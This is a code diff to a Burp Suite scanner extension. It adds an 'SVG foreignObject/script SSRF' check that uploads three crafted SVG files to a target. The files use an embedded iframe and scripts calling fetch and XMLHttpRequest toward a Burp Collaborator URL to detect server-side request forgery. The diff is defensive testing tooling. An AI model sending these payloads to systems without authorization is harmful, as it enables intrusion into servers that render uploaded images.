@@ -1269,6 +1269,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                 print "\nDoing XXE checks"
                 colab_tests.extend(self._xxe_svg_external_image(injector, burp_colab))
                 colab_tests.extend(self._xxe_svg_external_java_archive(injector, burp_colab))
+                colab_tests.extend(self._svg_foreign_object_ssrf(injector, burp_colab))
                 colab_tests.extend(self._xxe_xml(injector, burp_colab))
                 colab_tests.extend(self._xxe_office(injector, burp_colab))
                 colab_tests.extend(self._xxe_xmp(injector, burp_colab))
@@ -3134,6 +3135,75 @@ Response.write(a&c&b)
                      "Interactions:<br><br>".format(BurpExtender.MARKER_COLLAB_URL)
             issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)
             colab_tests.extend(self._send_collaborator(injector, burp_colab, self.SVG_TYPES, basename, base_svg, issue, redownload=True))
+        return colab_tests
+
+    def _svg_foreign_object_ssrf(self, injector, burp_colab):
+        colab_tests = []
+        if not burp_colab:
+            return colab_tests
+        if not injector.opts.file_formats['svg'].isSelected():
+            return colab_tests
+
+        name = "SVG foreignObject/script SSRF"
+        severity = "High"
+        confidence = "Firm"
+
+        # 1. <foreignObject><iframe src="...">
+        payload1 = ('<svg xmlns="http://www.w3.org/2000/svg" '
+                    'xmlns:xlink="http://www.w3.org/1999/xlink" '
+                    'width="100" height="100">'
+                    '<foreignObject width="100" height="100">'
+                    '<iframe xmlns="http://www.w3.org/1999/xhtml" '
+                    'src="' + BurpExtender.MARKER_COLLAB_URL + '" '
+                    'width="100" height="100"></iframe>'
+                    '</foreignObject></svg>')
+        basename1 = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SvgForeignIframe"
+        detail1 = ("A Burp Collaborator interaction was detected when uploading an SVG containing a "
+                   "<foreignObject><iframe> element with a Burp Collaborator URL as its src attribute. "
+                   "This indicates that the server-side SVG renderer (e.g. Inkscape, rsvg, Batik) "
+                   "fetched an external URL during processing, confirming Server Side Request Forgery. "
+                   "Interactions:<br><br>")
+        issue1 = self._create_issue_template(injector.get_brr(), name, detail1, confidence, severity)
+        colab_tests.extend(self._send_collaborator(injector, burp_colab, self.SVG_TYPES, basename1, payload1, issue1, redownload=True))
+
+        # 2. <script>fetch(...)
+        payload2 = ('<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
+                    '<script>'
+                    'try{fetch("' + BurpExtender.MARKER_COLLAB_URL + '");}catch(e){'
+                    'var x=new XMLHttpRequest();x.open("GET","' + BurpExtender.MARKER_COLLAB_URL + '",true);x.send();}'
+                    '</script>'
+                    '<text x="10" y="20">test</text></svg>')
+        basename2 = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SvgScriptFetch"
+        detail2 = ("A Burp Collaborator interaction was detected when uploading an SVG containing a "
+                   "<script> element that calls fetch()/XMLHttpRequest with a Burp Collaborator URL. "
+                   "This indicates that the server-side SVG renderer executed embedded JavaScript "
+                   "and issued an outbound HTTP request, confirming Server Side Request Forgery. "
+                   "Interactions:<br><br>")
+        issue2 = self._create_issue_template(injector.get_brr(), name, detail2, confidence, severity)
+        colab_tests.extend(self._send_collaborator(injector, burp_colab, self.SVG_TYPES, basename2, payload2, issue2, redownload=True))
+
+        # 3. <foreignObject><script>new XMLHttpRequest()...
+        payload3 = ('<svg xmlns="http://www.w3.org/2000/svg" '
+                    'xmlns:xlink="http://www.w3.org/1999/xlink" '
+                    'width="100" height="100">'
+                    '<foreignObject width="100" height="100">'
+                    '<body xmlns="http://www.w3.org/1999/xhtml">'
+                    '<script>'
+                    'var x=new XMLHttpRequest();'
+                    'x.open("GET","' + BurpExtender.MARKER_COLLAB_URL + '",true);'
+                    'x.send();'
+                    '</script>'
+                    '</body>'
+                    '</foreignObject></svg>')
+        basename3 = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SvgForeignXHR"
+        detail3 = ("A Burp Collaborator interaction was detected when uploading an SVG containing a "
+                   "<foreignObject><script> element that uses XMLHttpRequest with a Burp Collaborator URL. "
+                   "This indicates that the server-side SVG renderer executed embedded JavaScript inside "
+                   "a foreignObject HTML context and issued an outbound HTTP request, confirming "
+                   "Server Side Request Forgery. Interactions:<br><br>")
+        issue3 = self._create_issue_template(injector.get_brr(), name, detail3, confidence, severity)
+        colab_tests.extend(self._send_collaborator(injector, burp_colab, self.SVG_TYPES, basename3, payload3, issue3, redownload=True))
+
         return colab_tests
 
     def _xxe_xml(self, injector, burp_colab):
